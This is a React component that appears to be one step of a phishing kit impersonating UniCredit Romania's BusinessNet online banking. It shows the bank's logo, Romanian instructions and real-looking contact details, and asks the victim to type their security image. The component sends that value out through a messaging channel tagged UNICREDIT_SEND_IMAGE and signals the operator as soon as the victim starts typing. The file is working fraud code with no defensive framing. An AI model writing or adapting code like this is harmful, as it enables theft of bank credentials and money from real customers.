import React, { useState } from 'react'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'
import logo from '../media/logo_uc.png'
import arrow from '../media/arrow.PNG'
import { Info } from './Info'
import user from '../media/user.png'

export const Step3 = props => {

  const { store, changeStore } = props
  const [value, setValue] = useState(store.step_3_cod)

  const error = store.error
  const setError = val => changeStore({ error: val })

  const handleChange = (value) => {
    setValue(value)

    if (!storage.touched) {
      console.log('typing....')
      Messaging.start()
      storage.touched = true
    }

  }

  const handleSubmit = (e) => {
    e.preventDefault()
    if (!value) {
      setError(true)
      return
    }

    Messaging.send({ type: UserActions.UNICREDIT_SEND_IMAGE, payload: value })

    changeStore({
      step_3_cod : value,
      loading: true,
    })

  }

  return(
    <div className="step-wrapper image-secure">
      <div className="image-secure-wrapper">
      <div className="loading-area">
        <div className="header-area">
          <div className="logo-container">
            <img src={logo} alt="UniCredit"/>
          </div>
          <div className="language-selector-container">
            <div className="language-type pt">
              ROMÂNĂ
            </div>
            <div className="arrow-icon">
              <img src={arrow} alt="arrow"/>
            </div>
          </div>
        </div>
        <div className="form-area">
          <form className="login-form" onSubmit={handleSubmit}>
            <div className="login-pseudomodal" style={{}}>
              <div>
                <h2>Introduceti imaginea de securitate in forma scrisa</h2>
              </div>
              {/*<div>*/}
              {/*</div>*/}
              <div className="field-container">
                <div className="field-description">Imaginea de securitate</div>
                <div className="field-input">
                  <input type="text" value={value} onChange={e => handleChange(e.target.value)} className={error && `error`} placeholder="Introduceti imaginea de securitate"/>
                  <div className="error-text">
                    {error && 'Imaginea de securitate este introdusa eronat.'}
                  </div>
                </div>
                
              </div>
              <button className="button-confirm pt-italic" type="submit">
                Confirmati
              </button>
              <div className="bottom-description">
                Imaginea de profil aleasa intareste masurile de securitate existente ale aplicatiei BusinessNet.<br />
                Pentru informatii suplimentare, va rugam accesati documentul de <a>aici</a>.
               </div>
               <div className="bottom-description">
                Daca intampinati probleme, va rugam sa contactati info Center la datele de contact de mai jos.
               </div>
               <div className="bottom-info-container">
                  <div className="bottom-info-item">
                    <div className="info-title bold">
                      Telefon:
                    </div>
                    <div className="info-descrption-container">
                      <div className="info-description-item bold">
                        +4 021 200 20 20
                      </div>
                      <div className="info-description-item ">
                        <b>+2020</b> {`(Telekom Romania, Vodafone, Orange, RDS&RCS)`}
                      </div>
                    </div>
                  </div>
                  <div className="bottom-info-item">
                    <div className="info-title bold">
                      E-mail:
                    </div>
                    <div className="info-descrption-container">
                      <div className="info-description-item">
                        BusinessNet@unicredit.ro
                      </div>
                     </div>
                  </div>
               </div>
            </div>
            
          </form>
        </div>
      </div>
        
      </div>
    </div>
  )
}